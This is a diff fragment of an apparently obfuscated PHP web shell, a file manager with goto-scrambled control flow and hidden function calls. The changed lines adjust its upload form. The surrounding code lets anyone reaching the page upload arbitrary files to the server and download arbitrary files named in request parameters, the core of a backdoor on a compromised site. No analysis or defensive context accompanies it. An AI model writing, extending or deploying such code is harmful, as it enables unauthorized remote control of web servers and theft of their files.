@@ -109,7 +109,8 @@ color: lime!important;
 <li>Add File : <a href="?p=<?= ss($Jd) . "&a=" . Ss("newFile"); ?>" class="ohct">Submit</a></li>
 <li>Add Directory : <a href="?p=<?= Ss($Jd) . "&a=" . sS("newDir"); ?>" class="ohct">Submit</a></li>
 <li><form method="post" enctype="multipart/form-data" style="padding: 0.10rem;display: inline-block;">
-<input type="file" name="f[]" onchange="this.form.submit()" multiple>
+<input type="file" name="f[]" multiple>
+<input type="submit" style="padding-left: 1rem;padding-right: 1rem;padding-top: 3px;padding-bottom: 3px;border-radius: 5px;background-color: black;font-family: inherit;font-size: 16px;" value="Submit" name="submit">
 <?php if (!isset($_FILES["f"])) { goto ea; } $Wx = $_FILES["f"]["name"]; $lE = 0; th: if (!($lE < count($Wx))) { goto dx; } if ($c8[11]($_FILES["f"]["tmp_name"][$lE], $Wx[$lE])) { goto PG; } Xe("file failed to upload", 0); goto tG; PG: XE("file uploaded successfully"); tG: g9: $lE++; goto th; dx: ea: if (!isset($_GET["download"])) { goto FA; } header("Content-Type: application/octet-stream"); header("Content-Transfer-Encoding: Binary"); header("Content-Length: " . $c8[17](JD($_GET["n"]))); header("Content-disposition: attachment; filename=\"" . jd($_GET["n"]) . "\""); FA: ?> 
 </form></li>
 </div>
